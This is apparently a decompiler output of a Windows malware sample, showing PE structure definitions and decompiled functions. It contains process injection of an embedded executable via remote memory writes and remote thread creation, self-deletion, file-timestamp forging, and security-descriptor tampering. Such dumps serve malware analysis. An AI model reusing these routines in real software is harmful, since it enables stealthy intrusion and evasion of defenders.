    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct Var Var, *PVar;

struct Var {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct VS_VERSION_INFO VS_VERSION_INFO, *PVS_VERSION_INFO;

struct VS_VERSION_INFO {
    word StructLength;
    word ValueLength;
    word StructType;
    wchar16 Info[16];
    byte Padding[2];
    dword Signature;
    word StructVersion[2];
    word FileVersion[4];
    word ProductVersion[4];
    dword FileFlagsMask[2];
    dword FileFlags;
    dword FileOS;
    dword FileType;
    dword FileSubtype;
    dword FileTimestamp;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct VarFileInfo VarFileInfo, *PVarFileInfo;

struct VarFileInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct StringInfo StringInfo, *PStringInfo;

struct StringInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct StringFileInfo StringFileInfo, *PStringFileInfo;

struct StringFileInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef enum _SE_OBJECT_TYPE {
    SE_UNKNOWN_OBJECT_TYPE=0,
    SE_FILE_OBJECT=1,
    SE_SERVICE=2,
    SE_PRINTER=3,
    SE_REGISTRY_KEY=4,
    SE_LMSHARE=5,
    SE_KERNEL_OBJECT=6,
    SE_WINDOW_OBJECT=7,
    SE_DS_OBJECT=8,
    SE_DS_OBJECT_ALL=9,
    SE_PROVIDER_DEFINED_OBJECT=10,
    SE_WMIGUID_OBJECT=11,
    SE_REGISTRY_WOW64_32KEY=12
} _SE_OBJECT_TYPE;

typedef enum _SE_OBJECT_TYPE SE_OBJECT_TYPE;

typedef LONG LSTATUS;

typedef ACCESS_MASK REGSAM;

typedef uint size_t;

typedef struct IUnknown *LPUNKNOWN;




undefined4 FUN_00401000(LPCVOID param_1)

{
  LPCSTR in_EAX;
  undefined4 uVar1;
  HANDLE hFile;
  int iVar2;
  BOOL BVar3;
  DWORD dwFileOffsetLow;
  DWORD unaff_EBX;
  BOOL local_18;
  BOOL local_14;
  undefined4 local_10;
  PSECURITY_DESCRIPTOR local_c;
  PACL local_8;
  
  uVar1 = 0;
  local_10 = 0;
  if ((((in_EAX == (LPCSTR)0x0) || (param_1 == (LPCVOID)0x0)) || (unaff_EBX == 0)) ||
     (hFile = CreateFileA(in_EAX,0xc0000000,3,(LPSECURITY_ATTRIBUTES)0x0,2,0x80,(HANDLE)0x0),
     uVar1 = local_10, hFile == (HANDLE)0xffffffff)) {
    return uVar1;
  }
  iVar2 = FUN_00401e00();
  if ((iVar2 != 0) &&
     (iVar2 = ConvertStringSecurityDescriptorToSecurityDescriptorW
                        (u_S__ML__NRNWNX___LW__004045bc,1,&local_c,0), iVar2 != 0)) {
    local_8 = (PACL)0x0;
    BVar3 = GetSecurityDescriptorSacl(local_c,&local_18,&local_8,&local_14);
    if (BVar3 != 0) {
      SetNamedSecurityInfoA(in_EAX,SE_FILE_OBJECT,0x10,(PSID)0x0,(PSID)0x0,(PACL)0x0,local_8);
    }
    LocalFree(local_c);
  }
  local_c = (PSECURITY_DESCRIPTOR)0x0;
  dwFileOffsetLow = SetFilePointer(hFile,0,(PLONG)0x0,1);
  LockFile(hFile,dwFileOffsetLow,0,unaff_EBX,0);
  param_1 = (LPCVOID)WriteFile(hFile,param_1,unaff_EBX,(LPDWORD)&local_c,(LPOVERLAPPED)0x0);
  UnlockFile(hFile,dwFileOffsetLow,0,unaff_EBX,0);
  if (param_1 != (LPCVOID)0x0) {
    BVar3 = SetEndOfFile(hFile);
    uVar1 = 1;
    if (BVar3 != 0) goto LAB_00401108;
  }
  uVar1 = local_10;
LAB_00401108:
  param_1 = (LPCVOID)0x0;
  if (((hFile != (HANDLE)0x0) && (BVar3 = GetHandleInformation(hFile,(LPDWORD)&param_1), BVar3 != 0)
      ) && (((uint)param_1 & 2) == 0)) {
    CloseHandle(hFile);
  }
  return uVar1;
}



LPVOID FUN_00401150(DWORD *param_1)

{
  undefined4 nNumberOfBytesToLockLow;
  LPCSTR in_EAX;
  HANDLE hFile;
  HANDLE pvVar1;
  LPVOID _Dst;
  BOOL BVar2;
  LPVOID pvVar3;
  DWORD DVar4;
  LARGE_INTEGER local_20;
  DWORD local_18;
  DWORD local_14;
  DWORD local_10;
  LPVOID local_c [2];
  
  pvVar3 = (LPVOID)0x0;
  local_10 = 0;
  if ((in_EAX != (LPCSTR)0x0) &&
     (hFile = CreateFileA(in_EAX,0x80000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0x80,(HANDLE)0x0),
     hFile != (HANDLE)0xffffffff)) {
    local_20.s.LowPart = 0;
    local_20.s.HighPart = 0;
    GetFileSizeEx(hFile,&local_20);
    nNumberOfBytesToLockLow = local_20.s.LowPart;
    local_10 = local_20.s.LowPart;
    if (local_20.s.LowPart != 0) {
      pvVar3 = (LPVOID)(local_20.s.LowPart + 0x13 & 0xfffffff0);
      DVar4 = 8;
      local_c[0] = pvVar3;
      pvVar1 = GetProcessHeap();
      _Dst = HeapAlloc(pvVar1,DVar4,(SIZE_T)pvVar3);
      pvVar3 = _Dst;
      if (_Dst != (LPVOID)0x0) {
        memset(_Dst,0,(size_t)local_c[0]);
        local_14 = 0;
        local_c[0] = _Dst;
        local_18 = SetFilePointer(hFile,0,(PLONG)0x0,1);
        LockFile(hFile,local_18,0,nNumberOfBytesToLockLow,0);
        local_20.s.HighPart =
             ReadFile(hFile,_Dst,nNumberOfBytesToLockLow,&local_14,(LPOVERLAPPED)0x0);
        UnlockFile(hFile,local_18,0,nNumberOfBytesToLockLow,0);
        pvVar3 = local_c[0];
        if (local_20.s.HighPart == 0) {
          DVar4 = 0;
          pvVar3 = _Dst;
          pvVar1 = GetProcessHeap();
          BVar2 = HeapValidate(pvVar1,DVar4,pvVar3);
          if (BVar2 != 0) {
            DVar4 = 0;
            pvVar1 = GetProcessHeap();
            HeapFree(pvVar1,DVar4,_Dst);
          }
          local_c[0] = (LPVOID)0x0;
          pvVar3 = local_c[0];
        }
      }
    }
    local_c[0] = (LPVOID)0x0;
    if (((hFile != (HANDLE)0x0) &&
        (BVar2 = GetHandleInformation(hFile,(LPDWORD)local_c), BVar2 != 0)) &&
       (((uint)local_c[0] & 2) == 0)) {
      CloseHandle(hFile);
    }
  }
  if (param_1 != (DWORD *)0x0) {
    BVar2 = IsBadWritePtr(param_1,4);
    if (BVar2 == 0) {
      *param_1 = local_10;
      return pvVar3;
    }
  }
  return pvVar3;
}



void FUN_004012b0(void)

{
  BOOL BVar1;
  CHAR local_32c [260];
  CHAR local_228 [260];
  CHAR local_124 [260];
  _MEMORY_BASIC_INFORMATION local_20;
  
  local_20.AllocationBase = (HMODULE)0x0;
  local_20.AllocationProtect = 0;
  local_20.RegionSize = 0;
  local_20.State = 0;
  local_20.Protect = 0;
  local_20.Type = 0;
  local_20.BaseAddress = (PVOID)0x0;
  VirtualQuery(FUN_00401cb0,&local_20,0x1c);
  GetModuleFileNameA((HMODULE)local_20.AllocationBase,local_228,0x104);
  BVar1 = PathFileExistsA(local_228);
  if (BVar1 != 0) {
    GetTempPathA(0x104,local_32c);
    GetTempFileNameA(local_32c,(LPCSTR)0x0,0,local_124);
    BVar1 = MoveFileExA(local_228,local_124,1);
    if (BVar1 != 0) {
      SetFileAttributesA(local_124,0);
      BVar1 = DeleteFileA(local_124);
      if (BVar1 == 0) {
        MoveFileExA(local_124,(LPCSTR)0x0,4);
      }
    }
  }
  return;
}



uint FUN_00401390(uint param_1)

{
  undefined8 uVar1;
  DWORD DVar2;
  HMODULE hModule;
  FARPROC pFVar3;
  
  uVar1 = rdtsc();
  DAT_0045984c = DAT_0045984c ^ (uint)uVar1;
  DVar2 = GetTickCount();
  DAT_0045984c = DAT_0045984c ^ DVar2;
  hModule = GetModuleHandleA(s_ntdll_dll_00404560);
  if (hModule != (HMODULE)0x0) {
    pFVar3 = GetProcAddress(hModule,s_RtlUniform_0040456c);
    if (pFVar3 != (FARPROC)0x0) {
      (*pFVar3)(&DAT_0045984c);
    }
  }
  return DAT_0045984c % param_1;
}



LPVOID __fastcall FUN_004013e0(int param_1)

{
  LPVOID _Dst;
  HANDLE hHeap;
  uint _Size;
  DWORD dwFlags;
  uint dwBytes;
  
  _Dst = (LPVOID)0x0;
  if (param_1 != 0) {
    _Size = param_1 + 0x13U & 0xfffffff0;
    dwFlags = 8;
    dwBytes = _Size;
    hHeap = GetProcessHeap();
    _Dst = HeapAlloc(hHeap,dwFlags,dwBytes);
    if (_Dst != (LPVOID)0x0) {
      memset(_Dst,0,_Size);
    }
  }
  return _Dst;
}



char * FUN_00401420(int param_1)

{
  undefined8 uVar1;
  DWORD DVar2;
  HMODULE hModule;
  FARPROC pFVar3;
  uint uVar4;
  int iVar5;
  
  iVar5 = 0;
  uVar4 = DAT_0045984c;
  if (0 < param_1) {
    do {
      uVar1 = rdtsc();
      DAT_0045984c = uVar4 ^ (uint)uVar1;
      DVar2 = GetTickCount();
      DAT_0045984c = DAT_0045984c ^ DVar2;
      hModule = GetModuleHandleA(s_ntdll_dll_00404560);
      if ((hModule != (HMODULE)0x0) &&
         (pFVar3 = GetProcAddress(hModule,s_RtlUniform_0040456c), pFVar3 != (FARPROC)0x0)) {
        (*pFVar3)(&DAT_0045984c);
      }
      uVar4 = DAT_0045984c;
      s_dipgqk_0045d818[iVar5] = (char)DAT_0045984c + (char)(DAT_0045984c / 0x19) * -0x19 + 'a';
      iVar5 = iVar5 + 1;
    } while (iVar5 < param_1);
  }
  return s_dipgqk_0045d818;
}



undefined4 FUN_004014b0(DWORD param_1)

{
  HANDLE pvVar1;
  BOOL BVar2;
  CHAR local_168;
  undefined local_167 [263];
  undefined local_60 [72];
  _PROCESS_INFORMATION local_18;
  
  local_60._0_4_ = 0;
  memset(local_60 + 4,0,0x40);
  local_18.hProcess = (HANDLE)0x0;
  local_18.hThread = (HANDLE)0x0;
  local_18.dwProcessId = 0;
  local_18.dwThreadId = 0;
  local_168 = '\0';
  memset(local_167,0,0x103);
  lstrcpyn(&local_168,param_1,0x104);
  local_60._0_4_ = 0x44;
  BVar2 = CreateProcessA(&local_168,(LPSTR)0x0,(LPSECURITY_ATTRIBUTES)0x0,(LPSECURITY_ATTRIBUTES)0x0
                         ,0,0,(LPVOID)0x0,(LPCSTR)0x0,(LPSTARTUPINFOA)local_60,&local_18);
  pvVar1 = local_18.hThread;
  if (BVar2 != 0) {
    param_1 = 0;
    if (local_18.hThread != (HANDLE)0x0) {
      BVar2 = GetHandleInformation(local_18.hThread,&param_1);
      if ((BVar2 != 0) && ((param_1 & 2) == 0)) {
        CloseHandle(pvVar1);
      }
    }
    pvVar1 = local_18.hProcess;
    param_1 = 0;
    if (local_18.hProcess != (HANDLE)0x0) {
      BVar2 = GetHandleInformation(local_18.hProcess,&param_1);
      if ((BVar2 != 0) && ((param_1 & 2) == 0)) {
        CloseHandle(pvVar1);
      }
    }
    return 1;
  }
  return 0;
}



undefined4 FUN_004015a0(LPCSTR param_1)

{
  HANDLE hObject;
  LPSTR pCVar1;
  int iVar2;
  BOOL BVar3;
  DWORD DVar4;
  DWORD DVar5;
  uint uVar6;
  undefined local_12c [16];
  CHAR aCStack_11c [280];
  
  memset(local_12c,0,0x124);
  DVar5 = 0;
  hObject = (HANDLE)CreateToolhelp32Snapshot(2);
  if (hObject == (HANDLE)0xffffffff) {
    return 0;
  }
  Process32First(hObject,&stack0xfffffec8);
  do {
    pCVar1 = StrStrIA(aCStack_11c,param_1);
    DVar4 = 0x128;
    if (pCVar1 != (LPSTR)0x0) break;
    DVar4 = DVar5;
    iVar2 = Process32Next(hObject,&stack0xfffffec0);
    DVar5 = DVar4;
  } while (iVar2 != 0);
  uVar6 = 0;
  if (((hObject != (HANDLE)0x0) &&
      (BVar3 = GetHandleInformation(hObject,(LPDWORD)&stack0xfffffebc), BVar3 != 0)) &&
     ((uVar6 & 2) == 0)) {
    CloseHandle(hObject);
  }
  return DVar4;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

uint FUN_00401670(void)

{
  undefined4 *puVar1;
  int iVar2;
  DWORD in_EAX;
  DWORD DVar3;
  HANDLE hProcess;
  HMODULE pHVar4;
  FARPROC pFVar5;
  HANDLE pvVar6;
  LPVOID pvVar7;
  BOOL BVar8;
  LPTHREAD_START_ROUTINE lpStartAddress;
  int iVar9;
  SIZE_T *pSVar10;
  int *piVar11;
  SIZE_T local_18;
  HANDLE local_14;
  LPVOID local_10;
  int local_c;
  uint local_8;
  
  local_8 = 0;
  if (in_EAX == 0) {
    return 0;
  }
  iVar9 = 0;
  do {
    DVar3 = FUN_00401cf0();
    if (DVar3 != 0) break;
    Sleep(100);
    iVar9 = iVar9 + 1;
  } while (iVar9 < 0x1e);
  DVar3 = FUN_00401cf0();
  if (DVar3 == 0) {
    return local_8;
  }
  hProcess = OpenProcess(0x1f0fff,0,in_EAX);
  if (hProcess == (HANDLE)0x0) {
    return local_8;
  }
  local_c = 0;
  local_14 = hProcess;
  pHVar4 = GetModuleHandleA(s_kernel32_dll_00404578);
  if ((pHVar4 != (HMODULE)0x0) &&
     (pFVar5 = GetProcAddress(pHVar4,s_IsWow64Process_00404588), pFVar5 != (FARPROC)0x0)) {
    piVar11 = &local_c;
    pvVar6 = GetCurrentProcess();
    (*pFVar5)(pvVar6,piVar11);
  }
  if (local_c != 0) {
    local_c = 0;
    pHVar4 = GetModuleHandleA(s_kernel32_dll_00404578);
    if ((pHVar4 != (HMODULE)0x0) &&
       (pFVar5 = GetProcAddress(pHVar4,s_IsWow64Process_00404588), pFVar5 != (FARPROC)0x0)) {
      (*pFVar5)(hProcess,&local_c);
    }
    if (local_c == 0) goto LAB_004018b0;
  }
  iVar2 = DAT_0040643c;
  puVar1 = (undefined4 *)(&DAT_00406400 + DAT_0040643c);
  *(undefined4 *)(s__This_program_cannot_be_run_in_D_0040644d + DAT_0040643c + 0xb) = 0x53200;
  _DAT_00406400 = 0;
  iVar9 = *(int *)(s__This_program_cannot_be_run_in_D_0040644d + iVar2 + 3);
  *puVar1 = 0;
  pvVar7 = VirtualAllocEx(hProcess,(LPVOID)0x0,iVar9 + 0x53200,0x3000,0x40);
  local_10 = pvVar7;
  if (pvVar7 != (LPVOID)0x0) {
    WriteProcessMemory(hProcess,pvVar7,&DAT_00406400,
                       *(SIZE_T *)(s__This_program_cannot_be_run_in_D_0040644d + iVar2 + 7),
                       &local_18);
    local_c = 0;
    if (*(short *)(iVar2 + 0x406406) != 0) {
      pSVar10 = (SIZE_T *)((int)puVar1 + *(ushort *)(iVar2 + 0x406414) + 0x20);
      do {
        pvVar7 = VirtualAlloc((LPVOID)0x0,*pSVar10,0x3000,4);
        if (pvVar7 != (LPVOID)0x0) {
          memcpy(pvVar7,&DAT_00406400 + pSVar10[3],pSVar10[2]);
          WriteProcessMemory(local_14,(LPVOID)(pSVar10[1] + (int)local_10),pvVar7,*pSVar10,&local_18
                            );
          VirtualFree(pvVar7,0,0x8000);
        }
        local_c = local_c + 1;
        pSVar10 = pSVar10 + 10;
        hProcess = local_14;
        pvVar7 = local_10;
      } while (local_c < (int)(uint)*(ushort *)(iVar2 + 0x406406));
    }
    WriteProcessMemory(hProcess,(LPVOID)(*(int *)(s__This_program_cannot_be_run_in_D_0040644d +
                                                 iVar2 + 3) + (int)pvVar7),&DAT_00406400,0x53200,
                       &local_18);
    lpStartAddress = (LPTHREAD_START_ROUTINE)(*(int *)(iVar2 + 0x406428) + (int)pvVar7);
    FlushInstructionCache(hProcess,(LPCVOID)0x0,0);
    pvVar6 = CreateRemoteThread(hProcess,(LPSECURITY_ATTRIBUTES)0x0,0,lpStartAddress,(LPVOID)0x0,0,
                                (LPDWORD)0x0);
    if (pvVar6 == (HANDLE)0x0) {
      iVar9 = RtlCreateUserThread(hProcess,0,0,0,0,0,lpStartAddress,0,0,0);
      local_8 = (uint)(-1 < iVar9);
    }
    else {
      local_14 = (HANDLE)0x0;
      BVar8 = GetHandleInformation(pvVar6,(LPDWORD)&local_14);
      if ((BVar8 != 0) && (((uint)local_14 & 2) == 0)) {
        CloseHandle(pvVar6);
      }
      local_8 = 1;
    }
  }
LAB_004018b0:
  local_14 = (HANDLE)0x0;
  BVar8 = GetHandleInformation(hProcess,(LPDWORD)&local_14);
  if ((BVar8 != 0) && (((uint)local_14 & 2) == 0)) {
    CloseHandle(hProcess);
  }
  return local_8;
}



BOOL FUN_004018e0(LPCSTR param_1,LPCSTR param_2,LPCSTR param_3)

{
  int iVar1;
  HANDLE pvVar2;
  BOOL BVar3;
  LPCWSTR lpWideCharStr;
  uint uVar4;
  LPWSTR pWVar5;
  code *pcVar6;
  DWORD DVar7;
  uint uVar8;
  LPCWSTR lpMem;
  LPWSTR lpMem_00;
  undefined local_70 [76];
  _PROCESS_INFORMATION local_24;
  LPWSTR local_14;
  BOOL local_10;
  LPWSTR local_c;
  
  local_24.hThread = (HANDLE)0x0;
  local_24.dwProcessId = 0;
  local_24.dwThreadId = 0;
  local_14 = (LPWSTR)0x0;
  local_10 = 0;
  local_24.hProcess = (HANDLE)0x0;
  local_70._0_4_ = 0;
  memset(local_70 + 4,0,0x40);
  if ((param_2 != (LPCSTR)0x0) &&
     (iVar1 = MultiByteToWideChar(0,0,(LPCSTR)0x0,-1,(LPWSTR)0x0,0), pcVar6 = GetProcessHeap_exref,
     iVar1 != 0)) {
    local_c = (LPWSTR)0x0;
    if (iVar1 * 2 != -2) {
      uVar4 = iVar1 * 2 + 0x15U & 0xfffffff0;
      DVar7 = 8;
      uVar8 = uVar4;
      pvVar2 = GetProcessHeap();
      local_c = (LPWSTR)HeapAlloc(pvVar2,DVar7,uVar8);
      if (local_c != (LPWSTR)0x0) {
        memset(local_c,0,uVar4);
      }
    }
    if (local_c != (LPWSTR)0x0) {
      MultiByteToWideChar(0,0,param_2,-1,local_c,iVar1);
      lpWideCharStr = (LPCWSTR)0x0;
      if ((param_3 != (LPCSTR)0x0) &&
         (iVar1 = MultiByteToWideChar(0,0,(LPCSTR)0x0,-1,(LPWSTR)0x0,0), iVar1 != 0)) {
        if (iVar1 * 2 != -2) {
          uVar4 = iVar1 * 2 + 0x15U & 0xfffffff0;
          DVar7 = 8;
          uVar8 = uVar4;
          pvVar2 = GetProcessHeap();
          lpWideCharStr = (LPCWSTR)HeapAlloc(pvVar2,DVar7,uVar8);
          if (lpWideCharStr != (LPCWSTR)0x0) {
            memset(lpWideCharStr,0,uVar4);
          }
        }
        if (lpWideCharStr != (LPCWSTR)0x0) {
          MultiByteToWideChar(0,0,param_3,-1,lpWideCharStr,iVar1);
          pWVar5 = (LPWSTR)0x0;
          if ((param_1 != (LPCSTR)0x0) &&
             (iVar1 = MultiByteToWideChar(0,0,(LPCSTR)0x0,-1,(LPWSTR)0x0,0), iVar1 != 0)) {
            pWVar5 = (LPWSTR)0x0;
            if (iVar1 * 2 != -2) {
              uVar4 = iVar1 * 2 + 0x15U & 0xfffffff0;
              DVar7 = 8;
              uVar8 = uVar4;
              pvVar2 = GetProcessHeap();
              pWVar5 = (LPWSTR)HeapAlloc(pvVar2,DVar7,uVar8);
              if (pWVar5 != (LPWSTR)0x0) {
                memset(pWVar5,0,uVar4);
              }
            }
            pcVar6 = GetProcessHeap_exref;
            if (pWVar5 != (LPWSTR)0x0) {
              MultiByteToWideChar(0,0,param_1,-1,pWVar5,iVar1);
              pcVar6 = GetProcessHeap_exref;
            }
          }
          local_14 = pWVar5;
          if (pWVar5 != (LPWSTR)0x0) {
            local_70._0_4_ = 0x44;
            local_10 = CreateProcessWithLogonW
                                 (local_c,(LPCWSTR)0x0,lpWideCharStr,1,(LPCWSTR)0x0,pWVar5,0,
                                  (LPVOID)0x0,(LPCWSTR)0x0,(LPSTARTUPINFOW)local_70,&local_24);
          }
        }
      }
      DVar7 = 0;
      pWVar5 = local_c;
      pvVar2 = (HANDLE)(*pcVar6)();
      BVar3 = HeapValidate(pvVar2,DVar7,pWVar5);
      if (BVar3 != 0) {
        DVar7 = 0;
        pWVar5 = local_c;
        pvVar2 = (HANDLE)(*pcVar6)();
        HeapFree(pvVar2,DVar7,pWVar5);
      }
      if (lpWideCharStr != (LPCWSTR)0x0) {
        DVar7 = 0;
        lpMem = lpWideCharStr;
        pvVar2 = (HANDLE)(*pcVar6)();
        BVar3 = HeapValidate(pvVar2,DVar7,lpMem);
        if (BVar3 != 0) {
          DVar7 = 0;
          pvVar2 = (HANDLE)(*pcVar6)();
          HeapFree(pvVar2,DVar7,lpWideCharStr);
        }
      }
      pWVar5 = local_14;
      if (local_14 != (LPWSTR)0x0) {
        DVar7 = 0;
        lpMem_00 = local_14;
        pvVar2 = (HANDLE)(*pcVar6)();
        BVar3 = HeapValidate(pvVar2,DVar7,lpMem_00);
        if (BVar3 != 0) {
          DVar7 = 0;
          pvVar2 = (HANDLE)(*pcVar6)();
          HeapFree(pvVar2,DVar7,pWVar5);
        }
      }
    }
    return local_10;
  }
  return 0;
}



void FUN_00401b20(int param_1)

{
  undefined8 uVar1;
  LPVOID lpMem;
  int iVar2;
  DWORD DVar3;
  HMODULE hModule;
  FARPROC pFVar4;
  HANDLE pvVar5;
  BOOL BVar6;
  LPVOID lpMem_00;
  DWORD local_8;
  
  local_8 = 0;
  if (param_1 != 0) {
    lpMem = FUN_00401150(&local_8);
    if (lpMem != (LPVOID)0x0) {
      iVar2 = RtlImageNtHeader(lpMem);
      if (iVar2 != 0) {
        uVar1 = rdtsc();
        DAT_0045984c = DAT_0045984c ^ (uint)uVar1;
        DVar3 = GetTickCount();
        DAT_0045984c = DAT_0045984c ^ DVar3;
        hModule = GetModuleHandleA(s_ntdll_dll_00404560);
        if (hModule != (HMODULE)0x0) {
          pFVar4 = GetProcAddress(hModule,s_RtlUniform_0040456c);
          if (pFVar4 != (FARPROC)0x0) {
            (*pFVar4)(&DAT_0045984c);
          }
        }
        *(uint *)(iVar2 + 0x58) = DAT_0045984c / 0xffffffff + DAT_0045984c;
        FUN_00401000(lpMem);
      }
      DVar3 = 0;
      lpMem_00 = lpMem;
      pvVar5 = GetProcessHeap();
      BVar6 = HeapValidate(pvVar5,DVar3,lpMem_00);
      if (BVar6 != 0) {
        DVar3 = 0;
        pvVar5 = GetProcessHeap();
        HeapFree(pvVar5,DVar3,lpMem);
      }
    }
  }
  return;
}



void FUN_00401be0(LPCSTR param_1)

{
  HANDLE pvVar1;
  BOOL BVar2;
  _FILETIME local_24;
  _FILETIME local_1c;
  _FILETIME local_14;
  uint local_c [2];
  
  pvVar1 = CreateFileA(s_____globalroot_systemroot_system_0040452c,0x80000000,3,
                       (LPSECURITY_ATTRIBUTES)0x0,3,0x80,(HANDLE)0x0);
  if (pvVar1 != (HANDLE)0xffffffff) {
    GetFileTime(pvVar1,&local_24,&local_1c,&local_14);
    local_c[0] = 0;
    if (pvVar1 != (HANDLE)0x0) {
      BVar2 = GetHandleInformation(pvVar1,local_c);
      if ((BVar2 != 0) && ((local_c[0] & 2) == 0)) {
        CloseHandle(pvVar1);
      }
    }
    pvVar1 = CreateFileA(param_1,0xc0000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0x80,(HANDLE)0x0);
    if (pvVar1 != (HANDLE)0xffffffff) {
      SetFileTime(pvVar1,&local_24,&local_1c,&local_14);
      param_1 = (LPCSTR)0x0;
      if (pvVar1 != (HANDLE)0x0) {
        BVar2 = GetHandleInformation(pvVar1,(LPDWORD)&param_1);
        if ((BVar2 != 0) && (((uint)param_1 & 2) == 0)) {
          CloseHandle(pvVar1);
        }
      }
    }
  }
  return;
}



PVOID FUN_00401cb0(void)

{
  _MEMORY_BASIC_INFORMATION local_20;
  
  local_20.BaseAddress = (PVOID)0x0;
  local_20.AllocationBase = (PVOID)0x0;
  local_20.AllocationProtect = 0;
  local_20.RegionSize = 0;
  local_20.State = 0;
  local_20.Protect = 0;
  local_20.Type = 0;
  VirtualQuery(FUN_00401cb0,&local_20,0x1c);
  return local_20.AllocationBase;
}



DWORD FUN_00401cf0(void)

{
  HANDLE hObject;
  DWORD DVar1;
  BOOL BVar2;
  int iVar3;
  LPSTR pCVar4;
  undefined4 local_22c;
  undefined local_228 [28];
  CHAR local_20c [516];
  DWORD local_8;
  
  local_8 = 0;
  local_22c = 0;
  memset(local_228,0,0x220);
  hObject = (HANDLE)CreateToolhelp32Snapshot(8);
  if (hObject == (HANDLE)0xffffffff) {
    DVar1 = GetLastError();
    if (DVar1 == 0x18) {
      SwitchToThread();
      hObject = (HANDLE)CreateToolhelp32Snapshot(8);
      DVar1 = local_8;
      if (hObject != (HANDLE)0xffffffff) goto LAB_00401d58;
    }
    return local_8;
  }
  local_22c = 0x224;
  iVar3 = Module32First(hObject,&local_22c);
  DVar1 = local_8;
  while (iVar3 != 0) {
    local_8 = DVar1;
    pCVar4 = StrStrIA(local_20c,s_kernel_00404598);
    if ((pCVar4 != (LPSTR)0x0) && (pCVar4 = StrStrIA(pCVar4,&DAT_004045a0), pCVar4 != (LPSTR)0x0)) {
      DVar1 = 1;
      break;
    }
    iVar3 = Module32Next(hObject,&local_22c);
    DVar1 = local_8;
  }
LAB_00401d58:
  local_8 = 0;
  if (((hObject != (HANDLE)0x0) && (BVar2 = GetHandleInformation(hObject,&local_8), BVar2 != 0)) &&
     ((local_8 & 2) == 0)) {
    CloseHandle(hObject);
  }
  return DVar1;
}



undefined4 FUN_00401e00(void)

{
  HANDLE pvVar1;
  undefined4 uVar2;
  DWORD DVar3;
  BOOL BVar4;
  HANDLE *ppvVar5;
  _TOKEN_PRIVILEGES local_18;
  HANDLE local_8;
  
  ppvVar5 = &local_8;
  uVar2 = 0;
  BVar4 = 0;
  DVar3 = 0x20;
  pvVar1 = GetCurrentThread();
  BVar4 = OpenThreadToken(pvVar1,DVar3,BVar4,ppvVar5);
  if (BVar4 == 0) {
    ppvVar5 = &local_8;
    DVar3 = 0x20;
    pvVar1 = GetCurrentProcess();
    BVar4 = OpenProcessToken(pvVar1,DVar3,ppvVar5);
    if (BVar4 == 0) {
      return 0;
    }
  }
  local_18.PrivilegeCount = 1;
